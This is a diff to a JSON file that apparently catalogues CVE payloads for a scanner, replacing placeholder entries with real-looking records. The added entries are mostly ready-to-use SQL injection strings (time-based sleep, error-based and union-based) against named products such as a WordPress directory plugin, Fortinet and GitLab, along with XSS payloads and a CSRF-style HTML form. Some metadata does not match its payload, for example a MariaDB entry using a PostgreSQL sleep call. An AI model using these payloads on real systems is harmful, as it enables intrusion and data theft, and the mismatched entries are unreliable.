@@ -1,34 +1,135 @@
 {
   "cve_list": [
     {
-      "cve number": "example1",
-      "cvss": "8",
-      "os" : "unix/linux",
-      "technology" : "web",
-      "framework" : "jquery",
+      "cve number": "CVE-2024-41551",
+      "cvss": "9.8",
+      "os" : "",
+      "technology" : "",
+      "framework" : "MySQL",
       "endpoint" : "text",
-      "payloads":"1234567",
+      "payloads" : "/Supply_Management_System/admin/view_order_items.php?id=6' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+",
       "vuln":"sqli"
     },
     {
-      "cve number": "example2",
-      "cvss": "5",
-      "os" : "unix/linux",
-      "technology" : "web",
-      "framework" : "jquery",
-      "endpoint" : "hidden",
-      "payloads":"12345678",
+      "cve number": "CVE-2024-4443",
+      "cvss": "9.8",
+      "os" : "",
+      "technology" : "WordPress",
+      "framework" : "WordPress",
+      "endpoint" : "secret",
+      "payloads" : "<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1=1,5,0))+))--+-][1]=",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2024-3922",
+      "cvss": "10",
+      "os" : "",
+      "technology" : "",
+      "framework" : "MySQL",
+      "endpoint" : "text",
+      "payloads" : "and (select 1 from (select sleep( if(1=1,10,0) ))x )=",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2024-3552",
+      "cvss": "9.8",
+      "os" : "",
+      "technology" : "",
+      "framework" : "MySQL",
+      "endpoint" : "text",
+      "payloads":"parameter[]=(select+if(1=1,sleep(10),0)+from+(select+1)x)",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2024-3495",
+      "cvss": "9.8",
+      "os" : "",
+      "technology" : "",
+      "framework" : "MySQL",
+      "endpoint" : "text",
+      "payloads":"+or+0+union+select+concat(0x7368696e6e616d5f76756c3a,database()),2,3--+-",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2024-2879",
+      "cvss": "7.5",
+      "os" : "",
+      "technology" : "",
+      "framework" : "MySQL",
+      "endpoint" : "text",
+      "payloads":"[where]=1)and (SELECT 6416 FROM (SELECT(SLEEP(10)))nEiK)-- vqlq",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2024-1301",
+      "cvss": "9.8",
+      "os" : "Linux",
+      "technology" : "",
+      "framework" : "MariaDB",
+      "endpoint" : "text",
+      "payloads":"test'+AND+1=(SELECT+1+FROM+PG_SLEEP(10))+AND+'GKZy'='GKZy&j_password=test",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2023-48788",
+      "cvss": "9.8",
+      "os" : "Linux",
+      "technology" : "Fortinet",
+      "framework" : "",
+      "endpoint" : "text",
+      "payloads":"<fctid>' AND 1=0; WAITFOR DELAY '00:00:10' -- ‘",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2022-21661",
+      "cvss": "7.5",
+      "os" : "",
+      "technology" : "WordPress",
+      "framework" : "WordPress",
+      "endpoint" : "text",
+      "payloads":"action=<action_name>&nonce=a85a0c3bfa&query_vars={\"tax_query\":{\"0\":{\"field\":\"term_taxonomy_id\",\"terms\":[\"<inject>\"]}}}",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2022-1162",
+      "cvss": "9.8",
+      "os" : "",
+      "technology" : "GitLab",
+      "framework" : "GitLab",
+      "endpoint" : "text",
+      "payloads":"123qweQWE!@#000000000",
+      "vuln":"sqli"
+    },
+    {
+      "cve number": "CVE-2022-1051",
+      "cvss": "5.4",
+      "os" : "",
+      "technology" : "WPScan",
+      "framework" : "WPScan",
+      "endpoint" : "text",
+      "payloads":"<img src onerror=alert(/XSS/)>",
       "vuln":"xss"
     },
     {
-      "cve number": "example3",
-      "cvss": "6",
-      "os" : "unix/linux",
-      "technology" : "web",
-      "framework" : "jquery",
-      "endpoint" : "secret",
-      "payloads":"123456789",
-      "vuln":"csrf"
+      "cve number": "CVE-2022-1175",
+      "cvss": "6.1",
+      "os" : "",
+      "technology" : "GitLab",
+      "framework" : "GitLab",
+      "endpoint" : "text",
+      "payloads":"<pre data-sourcepos=\"\"%22 href=\"x\"></pre><base href=http://unsafe-website.com/><pre x=\"\"><code></code></pre><pre data-sourcepos=\"\"%22 href=\"x\"></pre><base href=http://unsafe-website.com/><pre x=\"\"><code></code></pre>",
+      "vuln":"xss"
+    }
+    ,
+    {
+      "cve number": "CVE-2022-1597",
+      "cvss": "6.1",
+      "os" : "",
+      "technology" : "DISCY",
+      "framework" : "WPScan",
+      "endpoint" : "text",
+      "payloads":"<html><body><script>history.pushState('', '', '/')</script><form action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"POST\"><input type=\"hidden\" name=\"user_mail\" value=\"validEmail@domain.com\" /><input type=\"hidden\" name=\"form_type\" value=\"wpqa_forget\" /><input type=\"hidden\" name=\"action\" value=\"wpqa_ajax_password_process\" /><input type=\"hidden\" name=\"redirect_to\" value=\"\"><img src=x onerror=alert(document.domain)>\" /><input type=\"submit\" value=\"Submit request\" /></form></body></html>",
+      "vuln":"xss"
     }
   ]
 }
